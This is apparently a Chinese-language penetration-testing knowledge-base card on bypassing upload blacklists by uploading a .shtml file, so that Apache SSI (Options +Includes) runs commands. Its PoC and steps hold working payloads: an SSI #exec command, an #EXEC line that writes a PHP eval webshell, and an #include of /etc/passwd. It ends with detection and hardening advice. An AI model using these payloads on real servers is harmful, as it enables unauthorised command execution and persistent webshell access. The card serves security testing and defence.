---
id: web-generic-file-upload-shtml-apache-ssi-exec
title: 上传 .shtml 借 Apache 既有 SSI 配置执行命令：上传只挡 php 后缀时用 shtml 写 WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: shtml-upload-apache-ssi-exec
tags:
- file-upload
- ssi
- shtml
- apache
- mod_include
- rce
- blacklist-bypass
- webshell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V615
  verified_at: '2026-11-12T20:44:15+08:00'
  notes: '已对照原文“另类利用”章节与图32-45核对：先传 php 被拒 Unsupported filetype uploaded、报错泄露 Apache/2.4.25 (Debian)、shell.shtml 内 #exec ls 访问回显、写 a.php+蚁剑连接、docker-php.conf 中 Options -Indexes +Includes 与 AllowOverride All 均一致；PoC 与原文一致。原文未给受影响版本（Apache 2.4.25 仅为靶场环境），未设 versions。与 web-php-rce-htaccess-ssi-includes-exec 前置不同（本卡依赖既有 +Includes，后者先传 .htaccess 开启），非重复，保留。已修正 AddType 仅设置 MIME 类型、真正挂 include 过滤器需 AddOutputFilter/AddHandler 的表述。未在本机复现。'
url: /docs/web/generic/file-upload/web-generic-file-upload-shtml-apache-ssi-exec/
draft: false
kb_aliases:
- shtml 上传 getshell
- SSI 上传绕过
- Apache +Includes 上传
- 上传黑名单漏 shtml
- shtml 命令执行
---

## 一句话结论

上传接口只拦截 `.php` 等脚本后缀、却放行 `.shtml`，而目标 Apache 目录已配置 `Options +Includes` 时，上传内容为 `<!--#exec cmd="..." -->` 的 `.shtml` 文件并在浏览器访问，即可让 Apache 执行系统命令，再借命令写 PHP WebShell 完成 Getshell。

## 原理

- Apache `mod_include` 会对被标记为 server-parsed 的文件解析 SSI 指令；是否解析由配置决定：`Options +Includes` 打开 SSI 能力，`AddOutputFilter INCLUDES .shtml`（或 `AddHandler server-parsed`；`XBitHack` 让带执行位的文件被解析）把 `.shtml` 挂到 include 过滤器；`AddType text/html .shtml` 只负责 MIME 类型。
- 上传接口的安全假设常是"只允许非脚本后缀即安全"，于是黑名单只列 `.php/.jsp/.asp` 等；`.shtml` 被视为静态 HTML 而放行。但在 SSI 开启的目录里，`.shtml` 是服务端可执行页面。
- 攻击者上传 `shell.shtml`，内容为 `<!--#exec cmd="ls -al" -->`；访问该 URL 时 Apache 以自身权限（如 www-data）执行命令并把结果插入响应。
- 进一步用 `<!--#EXEC cmd="echo '<?php eval($_POST[c]);?>' > a.php"-->` 在同目录写入 PHP 马；因目录可写且 PHP 可解析，连接即可获得 shell。
- 为什么成立：上传校验只针对扩展名/内容类型，未考虑服务器端解析器；SSI 的执行主体是 Apache 子进程，不受 PHP `disable_functions` 限制。
- 失败条件：目录配置为 `IncludesNOEXEC`（只禁 `#exec`，`#include` 仍可用）、上传目录不解析 SSI、或黑名单包含 `.shtml`。

## 触发条件

- 目标为 Apache 且已启用 SSI（IIS ServerSideIncludeModule 同理；Nginx SSI 不支持 `#exec`），上传目录位于 SSI 生效的 `<Directory>` 内。
- 上传接口允许 `.shtml`（黑名单只挡脚本后缀，或白名单含 html/shtml）。
- 上传目录可被 Web 访问，且对同目录写入的文件有解析权限（PHP 环境需要）。
- 攻击者能访问上传后的文件 URL。

## 利用步骤

1. 确认上传限制：先传 `.php` 观察是否返回 `Unsupported filetype uploaded.` 之类错误；再从响应头/报错确认中间件（如 `Apache/2.4.25 (Debian)`）。
2. 判断 SSI 是否开启：尝试访问已知 `.shtml`/`.shtm` 文件，或在上传页面测试；若可读到 Apache 配置（如 `docker-php.conf` 中 `<Directory /var/www/> Options -Indexes +Includes`），直接确认。
3. 制作 `shell.shtml`，内容 `<!--#exec cmd="ls -al" -->`；用原上传接口上传（扩展名改为 `.shtml`，内容类型可用 text/html）。
4. 访问返回的文件链接；若响应中出现目录列表/命令输出，SSI 执行成功。
5. 上传第二条 `<!--#EXEC cmd="echo '<?php eval($_POST[c]);?>' > a.php"-->` 或直接在同一文件里执行写马命令，访问/连接 `a.php`（蚁剑等）获得 WebShell。
6. 若 `#exec` 被 `IncludesNOEXEC` 禁用，改用 `#include file="/etc/passwd"` 读文件或结合其他漏洞。

## PoC

`shell.shtml`：

```html
<!--#exec cmd="ls -al" -->
```

写 PHP 马：

```html
<!--#EXEC cmd="echo '<?php eval($_POST[c]);?>' > a.php"-->
```

访问：

```bash
curl -s 'http://target/uploads/shell.shtml'
# 响应中出现命令输出（如 total ...、目录列表）
```

说明：上传 `.php` 被拒后改传 `.shtml`；目标 Apache 配置为 `Options -Indexes +Includes`、`AllowOverride All`。PoC 为靶场流程的结构化复现，未在本机执行，仅用于授权测试。

## 变体与关联

- 变体：后缀换成 `.shtm`、`.stm`；若黑名单也挡这些，尝试 `.htaccess` 打开 `AddOutputFilter INCLUDES .html` 后传 `.html`（见关联卡）。
- 变体：用 `#include` 读取源码/配置/密钥，或 `#fsize`/`#flastmod` 探测文件。
- 关联：[[web-php-rce-htaccess-ssi-includes-exec]]（无既有 +Includes 时先传 .htaccess 打开 SSI）、[[web-php-rce-ssi-injection-user-input-exec]]（输入反射型 SSI 注入）、[[web-generic-file-upload-upload-blacklist-miss-html-family-stored-xss]]（黑名单漏 html 家族的同类思路，但目标是存储型 XSS）。
- 边界：`IncludesNOEXEC`、上传目录不解析 SSI、黑名单覆盖 shtml、或上传后文件被重命名/隔离时，本链不成立。

## 检测与防御

- 检测：上传目录出现 `.shtml/.shtm/.stm` 文件；响应中出现命令输出；上传接口日志与 Web 访问日志中同名 shtml 文件先上传后立即访问；Apache 子进程异常派生 shell。
- 防御：上传白名单严格限定业务所需后缀（图片/文档），并校验真实内容类型；上传目录关闭 SSI 与脚本解析（`Options -Includes -ExecCGI`、`php_admin_flag engine off`）；文件落地后重命名并放到独立静态域；`IncludesNOEXEC` 作为纵深防御。
- 加固：上传目录与执行目录分离；以最小权限运行 Apache；监控 Web 根目录新增 shtml 文件与异常进程。
